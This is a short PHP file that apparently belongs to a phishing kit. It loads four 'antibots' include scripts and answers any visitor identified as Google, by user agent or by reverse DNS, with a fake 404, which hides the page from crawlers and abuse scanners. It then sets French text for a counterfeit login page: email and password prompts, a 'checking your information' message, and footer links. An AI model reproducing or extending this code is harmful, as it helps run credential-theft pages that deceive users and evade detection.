<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// connexion
$ERROR="Vérifiez votre saisie et réessayez.";
$Email= "Email";
$Password = "Mot de passe";
$dok = "Connexion";
$req1 = 'Entrez votre adresse email.';
$req2 = 'Entrez votre mot de passe.';
$forgot ="Vous n'arrivez pas à vous connecter ?";
$sign = "Ouvrir un compte";
$checking = "Vérification de vos informations...";
$priva = "Respect de la vie privée";
$ri8 = "Tous droits réservés";
$legal = "Juridique";
// fin connexioon
?>